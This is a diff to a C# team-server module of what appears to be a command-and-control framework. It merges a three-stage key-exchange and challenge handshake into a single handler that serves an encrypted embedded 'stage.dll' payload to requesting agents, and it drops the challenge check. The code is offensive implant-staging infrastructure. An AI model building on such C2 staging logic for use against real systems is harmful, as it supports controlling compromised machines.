@@ -3,7 +3,6 @@ using Shared.Utilities;
 
 using System;
 using System.Collections.Generic;
-using System.Linq;
 using System.Text;
 
 using TeamServer.Controllers;
@@ -36,18 +35,8 @@ namespace TeamServer.ServerModules
                 {
                     new ServerModule.Command
                     {
-                        Name = "Stage0Request",
-                        Delegate = HandleStage0Request
-                    },
-                    new ServerModule.Command
-                    {
-                        Name = "Stage1Request",
-                        Delegate = HandleStage1Request
-                    },
-                    new ServerModule.Command
-                    {
-                        Name = "Stage2Request",
-                        Delegate = HandleStage2Request
+                        Name = "StageRequest",
+                        Delegate = HandleStageRequest
                     },
                     new ServerModule.Command
                     {
@@ -68,79 +57,24 @@ namespace TeamServer.ServerModules
             };
         }
 
-        void HandleStage0Request(string AgentID, C2Data C2Data)
+        void HandleStageRequest(string AgentID, C2Data C2Data)
         {
-            var publicKey = Encoding.UTF8.GetString(C2Data.Data);
-            Agent.Crypto.AddAgentPublicKey(AgentID, publicKey);
+            var stage = Helpers.GetEmbeddedResource("stage.dll");
 
-            var data = Utilities.SerialiseData(new C2Data
+            var c2Data = Agent.Crypto.Encrypt(new C2Data
             {
                 Module = "Core",
-                Command = "Stage0Response",
-                Data = Encoding.UTF8.GetBytes(Agent.Crypto.PublicKey)
-            });
+                Command = "StageResponse",
+                Data = stage
+            },
+            out byte[] iv);
 
             Agent.SendAgentMessage(new AgentMessage
             {
                 AgentID = AgentID,
-                Data = data
+                Data = c2Data,
+                IV = iv
             });
-
-            OnAgentEvent?.Invoke(this, new AgentEvent(AgentID, AgentEvent.EventType.Stage0));
-        }
-
-        void HandleStage1Request(string AgentID, C2Data C2Data)
-        {
-            var sessionKey = Agent.Crypto.GenerateSessionKey(AgentID);
-            var challenge = Agent.Crypto.GenerateChallenge(AgentID);
-
-            var final = new byte[sessionKey.Length + challenge.Length];
-            Buffer.BlockCopy(sessionKey, 0, final, 0, sessionKey.Length);
-            Buffer.BlockCopy(challenge, 0, final, sessionKey.Length, challenge.Length);
-
-            var data = Agent.Crypto.Encrypt(AgentID, new C2Data
-            {
-                Module = "Core",
-                Command = "Stage1Response",
-                Data = final
-            });
-
-            Agent.SendAgentMessage(new AgentMessage
-            {
-                AgentID = AgentID,
-                Data = data
-            });
-
-            OnAgentEvent?.Invoke(this, new AgentEvent(AgentID, AgentEvent.EventType.Stage1));
-        }
-
-        void HandleStage2Request(string AgentID, C2Data C2Data)
-        {
-            var knownChallenge = Agent.Crypto.GetAgentChallenge(AgentID);
-
-            if (knownChallenge != null)
-            {
-                if (knownChallenge.SequenceEqual(C2Data.Data))
-                {
-                    var stager = Helpers.GetEmbeddedResource("stage.dll");
-                    var sessionKey = Agent.Crypto.GetSessionKey(AgentID);
-                    var data = Utilities.EncryptData(new C2Data
-                    {
-                        Module = "Core",
-                        Command = "Stage2Response",
-                        Data = stager
-                    }, sessionKey, out byte[] iv);
-
-                    Agent.SendAgentMessage(new AgentMessage
-                    {
-                        AgentID = AgentID,
-                        Data = data,
-                        IV = iv
-                    });
-
-                    OnAgentEvent?.Invoke(this, new AgentEvent(AgentID, AgentEvent.EventType.Stage2));
-                }
-            }
         }
 
         void HandleInitialCheckin(string AgentID, C2Data C2Data)
